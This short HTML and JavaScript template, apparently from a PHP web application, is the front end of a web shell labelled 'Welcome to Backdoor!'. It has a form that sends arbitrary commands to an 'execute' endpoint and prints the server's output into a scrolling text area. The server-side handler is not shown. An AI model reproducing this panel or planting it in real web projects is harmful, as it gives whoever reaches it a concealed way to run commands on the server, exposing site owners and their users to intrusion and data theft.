<textarea disabled rows="20" id="text" style="width: 98%">
<strong>Welcome to Backdoor!</strong>
</textarea>

<form action="index.php/futuregadget/execute" method="post" class="form" id="cmd">
	<input class="input input-xxlarge" name="cmd" id="cmd_text" />
	<button type="btn btn-primary">Execute</button>
</form>

<script type="text/javascript">
	$("#cmd").submit(function() {
		$("#cmd").ajaxSubmit({
			success: function(responseText, stautsText){
				$("#text").val($("#text").val() + responseText + "\n\n");
				var scrollTop = $("#text")[0].scrollHeight;
				$("#text").scrollTop(scrollTop);
			}
		});
		$("#cmd_text").val('');
		
		return false;
	})
</script>